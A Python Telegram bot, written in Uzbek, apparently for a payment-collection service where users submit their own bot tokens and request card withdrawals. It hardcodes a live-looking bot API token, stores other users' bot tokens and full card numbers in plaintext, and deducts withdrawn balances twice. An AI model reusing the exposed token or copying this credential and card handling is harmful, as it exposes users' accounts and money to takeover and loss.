import telebot
import sqlite3

TOKEN = "8806953267:AAFRzHzsaAZwQJEqyR2o8CbMzQ_SGEMN9oQ"
ADMIN_ID = 8211219159
ADMIN_ID = 8667483187

bot = telebot.TeleBot(TOKEN)

def create_db():
    conn = sqlite3.connect('paybot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        username TEXT,
        balance REAL DEFAULT 0,
        pending REAL DEFAULT 0,
        withdrawn REAL DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY,
        owner_id INTEGER,
        bot_token TEXT UNIQUE,
        bot_username TEXT,
        bot_name TEXT,
        is_active INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY,
        user_id INTEGER,
        amount REAL,
        card_number TEXT,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def get_user(tid):
    conn = sqlite3.connect('paybot.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE telegram_id=?', (tid,))
    u = c.fetchone()
    conn.close()
    return u

def add_user(tid, username):
    conn = sqlite3.connect('paybot.db')
    c = conn.cursor()
    try:
        c.execute('INSERT INTO users (telegram_id, username) VALUES (?,?)', (tid, username))
        conn.commit()
    except:
        pass
    conn.close()

def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📥 To'lovlar", "💼 Hisobim")
    markup.row("🤖 Mening botlarim", "📊 Statistika")
    markup.row("❓ Savol/Javob")
    return markup

# /start
@bot.message_handler(commands=['start'])
def start(message):
    add_user(message.from_user.id, message.from_user.username)
    bot.send_message(message.chat.id,
        "👋 Xush kelibsiz!\n\n"
        "💳 Bu bot orqali to'lovlarni qabul qilishingiz mumkin.\n\n"
        "👇 Bo'limdan birini tanlang:",
        reply_markup=main_menu())

# Hisobim
@bot.message_handler(func=lambda m: m.text == "💼 Hisobim")
def account(message):
    add_user(message.from_user.id, message.from_user.username)
    u = get_user(message.from_user.id)
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("📋 To'lovlar", callback_data='payments'),
        telebot.types.InlineKeyboardButton("💵 Pul yechish", callback_data='withdraw')
    )
    bot.send_message(message.chat.id,
        f"👤 Shaxsiy ma'lumotlar\n\n"
        f"🆔 ID: {message.from_user.id}\n"
        f"💰 Balans: {u[3]} so'm\n"
        f"⏳ Kutilayotgan: {u[4]} so'm\n"
        f"📤 Chiqargan pul: {u[5]} so'm",
        reply_markup=markup)

# Mening botlarim
@bot.message_handler(func=lambda m: m.text == "🤖 Mening botlarim")
def my_bots(message):
    conn = sqlite3.connect('paybot.db')
    c = conn.cursor()
    c.execute('SELECT * FROM bots WHERE owner_id=?', (message.from_user.id,))
    bots = c.fetchall()
    conn.close()

    markup = telebot.types.InlineKeyboardMarkup()
    
    if bots:
        for b in bots:
            status = "✅" if b[5] == 1 else "⏳"
            markup.row(telebot.types.InlineKeyboardButton(
                f"{status} @{b[4]}", callback_data=f'bot_{b[0]}'))
    
    markup.row(telebot.types.InlineKeyboardButton("➕ Bot qo'shish", callback_data='add_bot'))
    
    bot.send_message(message.chat.id,
        "🤖 Mening botlarim\n\n"
        f"Botlar soni: {len(bots)}\n\n"
        "Bot qo'shish uchun tugmani bosing:",
        reply_markup=markup)

# To'lovlar
@bot.message_handler(func=lambda m: m.text == "📥 To'lovlar")
def payments(message):
    bot.send_message(message.chat.id,
        "📥 So'nggi to'lovlar\n\n"
        "❌ Hozircha to'lovlar tarixi yo'q.")

# Statistika
@bot.message_handler(func=lambda m: m.text == "📊 Statistika")
def statistics(message):
    conn = sqlite3.connect('paybot.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users')
    users_count = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bots')
    bots_count = c.fetchone()[0]
    c.execute('SELECT COUNT(*) FROM bots WHERE is_active=1')
    active_bots = c.fetchone()[0]
    conn.close()
    bot.send_message(message.chat.id,
        f"📊 Statistika\n\n"
        f"👥 Foydalanuvchilar: {users_count}\n"
        f"🤖 Jami botlar: {bots_count}\n"
        f"✅ Faol botlar: {active_bots}")

# Savol/Javob
@bot.message_handler(func=lambda m: m.text == "❓ Savol/Javob")
def faq(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(telebot.types.InlineKeyboardButton("⏰ Pul chiqarish vaqti?", callback_data='faq_1'))
    markup.row(telebot.types.InlineKeyboardButton("💳 Komissiya necha foiz?", callback_data='faq_2'))
    markup.row(telebot.types.InlineKeyboardButton("🤖 Botni qanday qo'shaman?", callback_data='faq_3'))
    markup.row(telebot.types.InlineKeyboardButton("❓ Moderatsiya tasdiqlanmaydi?", callback_data='faq_4'))
    bot.send_message(message.chat.id, "❓ Savol tanlang:", reply_markup=markup)

# Admin panel
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "❌ Sizda ruxsat yo'q!")
        return
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(telebot.types.InlineKeyboardButton("👥 Foydalanuvchilar", callback_data='admin_users'))
    markup.row(telebot.types.InlineKeyboardButton("🤖 Botlar ro'yxati", callback_data='admin_bots'))
    markup.row(telebot.types.InlineKeyboardButton("💵 Pul yechish so'rovlari", callback_data='admin_withdrawals'))
    markup.row(telebot.types.InlineKeyboardButton("📢 Xabar yuborish", callback_data='admin_broadcast'))
    bot.send_message(message.chat.id, "👑 Admin panel:", reply_markup=markup)

user_states = {}

# Callback handler
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    uid = call.from_user.id

    if call.data == 'add_bot':
        bot.answer_callback_query(call.id)
        user_states[uid] = 'waiting_bot_token'
        bot.send_message(call.message.chat.id,
            "🤖 Bot qo'shish\n\n"
            "Botingizning tokenini yuboring:\n"
            "(BotFather dan olasiz)")

    elif call.data == 'withdraw':
        bot.answer_callback_query(call.id)
        u = get_user(uid)
        if u[3] < 10000:
            bot.send_message(call.message.chat.id,
                "❌ Minimal pul yechish miqdori: 10,000 so'm\n\n"
                f"Sizning balansingiz: {u[3]} so'm")
        else:
            user_states[uid] = 'waiting_withdraw_amount'
            bot.send_message(call.message.chat.id,
                f"💵 Pul yechish\n\n"
                f"Mavjud balans: {u[3]} so'm\n\n"
                "Qancha yechmoqchisiz? (so'mda yozing)")

    elif call.data == 'faq_1':
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
            "⏰ Pul chiqarish vaqti:\n\n"
            "🕐 Odatda 1-24 soat ichida\n"
            "📌 Dam olish kunlari 2-3 kun")

    elif call.data == 'faq_2':
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
            "💳 Komissiya: 4%\n\n"
            "Click, Payme, Uzum orqali o'tkazmalarda olinadi.")

    elif call.data == 'faq_3':
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
            "🤖 Bot qo'shish:\n\n"
            "1. 'Mening botlarim' ga kiring\n"
            "2. 'Bot qo'shish' tugmasini bosing\n"
            "3. Bot tokenini yuboring\n"
            "4. Moderatsiyadan o'tadi\n"
            "5. Tasdiqlangach ishlaydi ✅")

    elif call.data == 'faq_4':
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id,
            "❓ Moderatsiya tasdiqlanmaydi?\n\n"
            "❌ Bot to'liq ishlamasa\n"
            "❌ Logotip bo'lmasa\n"
            "❌ Shubhali xizmat bo'lsa\n"
            "❌ Tavsif to'liq bo'lmasa\n\n"
            "✅ Sabab ko'rsatiladi va qayta yuborishingiz mumkin.")

    elif call.data == 'admin_users':
        if uid != ADMIN_ID:
            return
        bot.answer_callback_query(call.id)
        conn = sqlite3.connect('paybot.db')
        c = conn.cursor()
        c.execute('SELECT telegram_id, username, balance FROM users ORDER BY id DESC LIMIT 10')
        users = c.fetchall()
        conn.close()
        text = "👥 So'nggi foydalanuvchilar:\n\n"
        for u in users:
            text += f"🆔 {u[0]} | @{u[1]} | 💰 {u[2]} so'm\n"
        bot.send_message(call.message.chat.id, text)

    elif call.data == 'admin_bots':
        if uid != ADMIN_ID:
            return
        bot.answer_callback_query(call.id)
        conn = sqlite3.connect('paybot.db')
        c = conn.cursor()
        c.execute('SELECT id, bot_name, bot_username, is_active, owner_id FROM bots ORDER BY id DESC LIMIT 10')
        bots_list = c.fetchall()
        conn.close()
        if not bots_list:
            bot.send_message(call.message.chat.id, "❌ Hozircha botlar yo'q.")
            return
        markup = telebot.types.InlineKeyboardMarkup()
        for b in bots_list:
            status = "✅" if b[3] == 1 else "⏳"
            markup.row(telebot.types.InlineKeyboardButton(
                f"{status} {b[1]}", callback_data=f'approve_{b[0]}'))
        bot.send_message(call.message.chat.id, "🤖 Botlar ro'yxati:", reply_markup=markup)

    elif call.data.startswith('approve_'):
        if uid != ADMIN_ID:
            return
        bot.answer_callback_query(call.id)
        bot_id = int(call.data.split('_')[1])
        conn = sqlite3.connect('paybot.db')
        c = conn.cursor()
        c.execute('UPDATE bots SET is_active=1 WHERE id=?', (bot_id,))
        c.execute('SELECT owner_id, bot_name FROM bots WHERE id=?', (bot_id,))
        b = c.fetchone()
        conn.commit()
        conn.close()
        bot.send_message(call.message.chat.id, f"✅ Bot tasdiqlandi!")
        try:
            bot.send_message(b[0], f"✅ Botingiz tasdiqlandi!\n\n🤖 {b[1]} endi faol!")
        except:
            pass

    elif call.data == 'admin_withdrawals':
        if uid != ADMIN_ID:
            return
        bot.answer_callback_query(call.id)
        conn = sqlite3.connect('paybot.db')
        c = conn.cursor()
        c.execute('SELECT id, user_id, amount, card_number, status FROM withdrawals WHERE status="pending"')
        withdrawals = c.fetchall()
        conn.close()
        if not withdrawals:
            bot.send_message(call.message.chat.id, "❌ Kutilayotgan so'rovlar yo'q.")
            return
        for w in withdrawals:
            markup = telebot.types.InlineKeyboardMarkup()
            markup.row(
                telebot.types.InlineKeyboardButton("✅ Tasdiqlash", callback_data=f'wd_approve_{w[0]}'),
                telebot.types.InlineKeyboardButton("❌ Rad etish", callback_data=f'wd_reject_{w[0]}')
            )
            bot.send_message(call.message.chat.id,
                f"💵 Pul yechish so'rovi\n\n"
                f"👤 User ID: {w[1]}\n"
                f"💰 Miqdor: {w[2]} so'm\n"
                f"💳 Karta: {w[3]}",
                reply_markup=markup)

    elif call.data.startswith('wd_approve_'):
        if uid != ADMIN_ID:
            return
        wd_id = int(call.data.split('_')[2])
        conn = sqlite3.connect('paybot.db')
        c = conn.cursor()
        c.execute('SELECT user_id, amount FROM withdrawals WHERE id=?', (wd_id,))
        wd = c.fetchone()
        c.execute('UPDATE withdrawals SET status="approved" WHERE id=?', (wd_id,))
        c.execute('UPDATE users SET withdrawn=withdrawn+?, balance=balance-? WHERE telegram_id=?',
                  (wd[1], wd[1], wd[0]))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "✅ Tasdiqlandi!")
        bot.send_message(call.message.chat.id, "✅ To'lov tasdiqlandi!")
        try:
            bot.send_message(wd[0], f"✅ Pul yechish tasdiqlandi!\n💰 {wd[1]} so'm kartangizga yuborildi.")
        except:
            pass

    elif call.data.startswith('wd_reject_'):
        if uid != ADMIN_ID:
            return
        wd_id = int(call.data.split('_')[2])
        conn = sqlite3.connect('paybot.db')
        c = conn.cursor()
        c.execute('SELECT user_id, amount FROM withdrawals WHERE id=?', (wd_id,))
        wd = c.fetchone()
        c.execute('UPDATE withdrawals SET status="rejected" WHERE id=?', (wd_id,))
        c.execute('UPDATE users SET balance=balance+? WHERE telegram_id=?', (wd[1], wd[0]))
        conn.commit()
        conn.close()
        bot.answer_callback_query(call.id, "❌ Rad etildi!")
        bot.send_message(call.message.chat.id, "❌ Rad etildi, balans qaytarildi.")
        try:
            bot.send_message(wd[0], f"❌ Pul yechish rad etildi.\n💰 {wd[1]} so'm balansingizga qaytarildi.")
        except:
            pass

# Matn handler (state lar uchun)
@bot.message_handler(func=lambda m: True)
def text_handler(message):
    uid = message.from_user.id
    state = user_states.get(uid)

    if state == 'waiting_bot_token':
        token = message.text.strip()
        try:
            import requests
            r = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
            if r['ok']:
                bname = r['result']['first_name']
                busername = r['result']['username']
                conn = sqlite3.connect('paybot.db')
                c = conn.cursor()
                try:
                    c.execute('INSERT INTO bots (owner_id, bot_token, bot_username, bot_name) VALUES (?,?,?,?)',
                              (uid, token, busername, bname))
                    conn.commit()
                    conn.close()
                    user_states.pop(uid, None)
                    markup = telebot.types.InlineKeyboardMarkup()
                    markup.row(telebot.types.InlineKeyboardButton("🤖 Botlarimga qaytish", callback_data='my_bots'))
                    bot.send_message(message.chat.id,
                        f"✅ Bot qo'shildi!\n\n"
                        f"🤖 Nom: {bname}\n"
                        f"👤 Username: @{busername}\n\n"
                        f"⏳ Moderatsiyadan o'tkazilmoqda...",
                        reply_markup=markup)
                    # Admin ga xabar
                    try:
                        bot.send_message(ADMIN_ID,
                            f"🆕 Yangi bot qo'shildi!\n\n"
                            f"🤖 {bname} (@{busername})\n"
                            f"👤 Egasi: {uid}\n\n"
                            f"Tasdiqlash uchun /admin")
                    except:
                        pass
                except:
                    conn.close()
                    bot.send_message(message.chat.id, "❌ Bu bot allaqachon qo'shilgan!")
            else:
                bot.send_message(message.chat.id, "❌ Token noto'g'ri! Qayta kiriting:")
        except:
            bot.send_message(message.chat.id, "❌ Xatolik! Token to'g'riligini tekshiring.")

    elif state == 'waiting_withdraw_amount':
        try:
            amount = float(message.text.strip())
            u = get_user(uid)
            if amount < 10000:
                bot.send_message(message.chat.id, "❌ Minimal miqdor: 10,000 so'm")
                return
            if amount > u[3]:
                bot.send_message(message.chat.id, f"❌ Balansingiz yetarli emas!\nBalans: {u[3]} so'm")
                return
            user_states[uid] = {'state': 'waiting_card', 'amount': amount}
            bot.send_message(message.chat.id,
                f"💳 Karta raqamingizni kiriting:\n(16 raqam, bo'sh joysiz)")
        except:
            bot.send_message(message.chat.id, "❌ Faqat raqam kiriting!")

    elif isinstance(state, dict) and state.get('state') == 'waiting_card':
        card = message.text.strip().replace(' ', '')
        if len(card) != 16 or not card.isdigit():
            bot.send_message(message.chat.id, "❌ Karta raqami 16 ta raqamdan iborat bo'lishi kerak!")
            return
        amount = state['amount']
        conn = sqlite3.connect('paybot.db')
        c = conn.cursor()
        c.execute('INSERT INTO withdrawals (user_id, amount, card_number) VALUES (?,?,?)',
                  (uid, amount, card))
        c.execute('UPDATE users SET balance=balance-?, pending=pending+? WHERE telegram_id=?',
                  (amount, amount, uid))
        conn.commit()
        conn.close()
        user_states.pop(uid, None)
        bot.send_message(message.chat.id,
            f"✅ Pul yechish so'rovi yuborildi!\n\n"
            f"💰 Miqdor: {amount} so'm\n"
            f"💳 Karta: {card[:4]}****{card[-4:]}\n\n"
            f"⏳ 1-24 soat ichida amalga oshiriladi.",
            reply_markup=main_menu())
        try:
            bot.send_message(ADMIN_ID,
                f"💵 Yangi pul yechish so'rovi!\n\n"
                f"👤 User: {uid}\n"
                f"💰 Miqdor: {amount} so'm\n"
                f"💳 Karta: {card}\n\n"
                f"Ko'rish uchun /admin")
        except:
            pass

create_db()
print("✅ Bot ishga tushdi!")
bot.infinity_polling(timeout=10, long_polling_timeout=5)
